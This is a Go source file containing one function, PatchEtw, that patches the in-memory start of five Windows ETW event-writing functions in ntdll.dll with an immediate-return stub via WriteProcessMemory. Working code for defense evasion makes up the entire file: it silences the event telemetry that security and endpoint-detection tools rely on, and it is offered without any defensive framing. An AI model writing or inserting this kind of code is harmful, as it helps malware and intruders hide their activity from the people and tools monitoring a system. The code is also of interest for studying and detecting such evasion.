package core

import (
  "unsafe"
  "syscall"
  "encoding/hex"
)

func PatchEtw() (error) {
  ntdll                     := syscall.NewLazyDLL("ntdll.dll")
  procWriteProcessMemory    := syscall.NewLazyDLL("kernel32.dll").NewProc("WriteProcessMemory")

  procEtwEventWrite         := ntdll.NewProc("EtwEventWrite")
  procEtwEventWriteEx       := ntdll.NewProc("EtwEventWriteEx")
  procEtwEventWriteFull     := ntdll.NewProc("EtwEventWriteFull")
  procEtwEventWriteString   := ntdll.NewProc("EtwEventWriteString")
  procEtwEventWriteTransfer := ntdll.NewProc("EtwEventWriteTransfer")

  handle := uintptr(0xffffffffffffffff)

  dataAddr := []uintptr{ 
    procEtwEventWriteFull.Addr(), 
    procEtwEventWrite.Addr(),
    procEtwEventWriteEx.Addr(),
    procEtwEventWriteString.Addr(),
    procEtwEventWriteTransfer.Addr(),
  }

  for i, _ := range dataAddr {

    data, _ := hex.DecodeString("4833C0C3")
    var nLength uintptr

    procWriteProcessMemory.Call(
      uintptr(handle),
      uintptr(dataAddr[i]),
      uintptr(unsafe.Pointer(&data[0])),
      uintptr(len(data)),
      uintptr(unsafe.Pointer(&nLength)),
    )
  }

  return nil
}



